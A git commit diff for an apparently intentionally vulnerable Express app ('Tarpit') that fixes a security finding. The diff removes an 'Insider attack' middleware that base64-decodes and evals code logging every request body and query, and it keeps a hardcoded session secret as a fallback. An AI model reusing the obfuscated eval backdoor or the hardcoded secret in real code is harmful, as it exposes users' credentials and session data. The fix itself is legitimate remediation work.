6b0bd0f79a307f83729e32adef85f73ace81ede9
Magno Gomes <117935539+ongamse@users.noreply.github.com>
2024-10-04 22:09:23 -0400

    Fixing src/server.js for finding 21

--- src/server.js
+++ src/server.js
@@ -2,14 +2,13 @@ const express = require('express');
 const cookieParser = require('cookie-parser');
 const bodyParser = require('body-parser');
 const session = require('express-session');
-
 const { logger } = require('./Logger');
 const registerApiRoutes = require('./api');
 const registerViewRoutes = require('./views');
 
 const app = express();
 const port = process.env.PORT || 8088;
-const SESSION_SECRET_KEY = 'kjhdkd-sjkhsjsh-kjshshkdhsk-jsjhd';
+const SESSION_SECRET_KEY = process.env.SESSION_SECRET_KEY || 'kjhdkd-sjkhsjsh-kjshshkdhsk-jsjhd';
 
 const tarpitEnv = {
   sessionSecretKey: process.env.SESSION_SECRET_KEY || SESSION_SECRET_KEY,
@@ -17,27 +16,6 @@ const tarpitEnv = {
 };
 
 app.set('tarpitEnv', tarpitEnv);
-
-// Insider attack
-const insider = function(req, res, next) {
-  /* Base64 Encoding of
-   * console.log(req);
-   * console.log(req.body);
-   * console.log(req.query);
-   */
-  const encoded =
-    'Y29uc29sZS5sb2cocmVxKTsgY29uc29sZS5sb2cocmVxLmJvZHkpOyBjb25zb2xlLmxvZyhyZXEucXVlcnkpOw==';
-  const newBuf = Buffer.from(encoded, 'base64');
-  eval(newBuf.toString('utf-8'));
-  next();
-};
-
-app.use(insider);
-
-app.use(function(err, req, res, next) {
-  logger.error(err.stack);
-  res.status(500).send('Something broke!');
-});
 
 // parse application/x-www-form-urlencoded
 app.use(bodyParser.urlencoded({ extended: false }));
@@ -49,9 +27,10 @@ app.use(cookieParser());
 
 app.use(
   session({
-    secret: SESSION_SECRET_KEY,
+    secret: process.env.SESSION_SECRET_KEY || SESSION_SECRET_KEY,
     resave: false,
-    saveUninitialized: false
+    saveUninitialized: false,
+    cookie: { secure: true, httpOnly: true }
   })
 );
 
@@ -66,3 +45,5 @@ app.listen(port, () =>
     `Tarpit App listening on port ${port}!. Open url: http://localhost:${port}`
   )
 );
+
+
